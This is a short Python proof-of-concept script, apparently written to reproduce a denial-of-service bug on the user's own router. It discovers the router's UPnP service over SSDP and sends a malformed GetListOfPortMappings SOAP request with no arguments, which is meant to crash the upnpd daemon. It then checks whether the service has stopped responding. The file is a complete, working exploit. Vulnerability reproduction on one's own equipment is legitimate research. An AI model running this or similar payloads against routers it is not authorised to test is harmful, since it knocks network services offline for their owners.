#!/usr/bin/env python3
"""
DOS-01 real-router test. Python 3, standard library only.
Sends ONE SOAP GetListOfPortMappings with no arguments to the router's UPnP port, then checks whether the
UPnP service still answers. EFFECT ON ROUTER: if vulnerable, upnpd (UPnP only) crashes and is restarted by
the system (a few seconds to never, depending on the supervisor). Routing/Wi-Fi are not affected.
Run on the PC's real LAN:  python dos01_real_router_test.py [router_ip]
"""
import re, socket, sys, time
ROUTER = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.1"

def discover():
    msg = ("M-SEARCH * HTTP/1.1\r\nHOST: %s:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\n"
           "ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n\r\n" % ROUTER).encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3)
    s.sendto(msg, (ROUTER, 1900))
    try:
        d, _ = s.recvfrom(4096)
    except socket.timeout:
        return None
    m = re.search(r"LOCATION:\s*http://([\d.]+):(\d+)/", d.decode("latin-1"), re.I)
    return int(m.group(2)) if m else None

def soap(port, action, args=""):
    body = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
            's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
            f'<u:{action} xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">{args}</u:{action}>'
            '</s:Body></s:Envelope>')
    req = (f"POST /ctl/IPConn HTTP/1.1\r\nHost: {ROUTER}:{port}\r\nContent-Type: text/xml\r\n"
           f"Content-Length: {len(body)}\r\nSOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#{action}\"\r\n"
           f"Connection: close\r\n\r\n{body}").encode()
    try:
        s = socket.create_connection((ROUTER, port), timeout=5)
        s.sendall(req); out = b""
        while True:
            d = s.recv(4096)
            if not d: break
            out += d
        s.close()
        return out.decode("latin-1")
    except OSError as e:
        return f"(error: {e})"

port = discover()
if not port:
    print("No UPnP router answered SSDP. Check LAN / UPnP setting / not WSL2-NAT."); sys.exit(1)
print(f"Router {ROUTER}, UPnP port {port}")
print("Before: ", soap(port, "GetSpecificPortMappingEntry",
      "<NewRemoteHost></NewRemoteHost><NewExternalPort>1</NewExternalPort><NewProtocol>TCP</NewProtocol>").splitlines()[0])
print("Sending GetListOfPortMappings WITHOUT arguments...")
r = soap(port, "GetListOfPortMappings")
print("Reply:", r.splitlines()[0] if r else "(connection closed, no reply)")
time.sleep(2)
after = soap(port, "GetSpecificPortMappingEntry",
             "<NewRemoteHost></NewRemoteHost><NewExternalPort>1</NewExternalPort><NewProtocol>TCP</NewProtocol>")
print("After:  ", after.splitlines()[0] if after else "(no reply)")
if after.startswith("(error") or not after:
    print("=== service stopped answering right after the request -> DOS-01 likely reproduced. "
          "The UPnP port may also have changed after restart; re-run SSDP. ===")
else:
    print("=== UPnP still answers. If the first Reply line was an error/closed connection, run it once more "
          "and compare the UPnP port from SSDP before/after. ===")
